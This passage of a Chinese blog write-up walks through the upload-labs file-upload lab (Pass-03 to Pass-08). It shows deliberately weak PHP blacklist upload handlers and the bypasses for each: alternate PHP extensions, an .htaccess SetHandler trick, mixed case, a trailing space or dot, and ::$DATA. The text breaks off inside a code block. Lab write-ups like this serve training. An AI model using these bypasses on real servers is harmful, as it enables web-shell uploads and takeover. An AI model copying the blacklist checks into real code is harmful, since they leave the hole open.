aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>抓包改Content-Type即可。</p><h3 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.asp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.aspx'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里不允许上传 .asp, .aspx, .php, .jsp后缀文件，但可以上传其他的后缀,如</p><pre class="line-numbers language-none"><code class="language-none">.phtml .phps .php5 .pht<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前提是 apache 的 httpd.conf 中有如下配置代码</p><pre class="line-numbers language-none"><code class="language-none">AddType application/x-httpd-php .php .phtml .phps .php5 .pht<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者上传 .htaccess 文件</p><pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch "shell.jpg&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是需要mod_rewrite 开启；且AllowOverride All</p><p>此时上传的 shell.jpg 会被解析成 php</p><p>一般黑名单都可以利用apache解析漏洞绕过</p><h3 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04 .htaccess绕过"></a>Pass-04 .htaccess绕过</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pHp1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'此文件不允许上传!'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和上题一样，.htaccess绕过</p><h3 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传<code>Php</code>绕过黑名单</p><h3 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h3><p>在文件后缀名上加一个空格就行了</p><h3 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h3><p>上传<code>.php.</code>绕过</p><h3 id="Pass-08-DATA-绕过"><a href="#Pass-08-DATA-绕过" class="headerlink" title="Pass-08 ::$DATA 绕过"></a>Pass-08 ::$DATA 绕过</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span 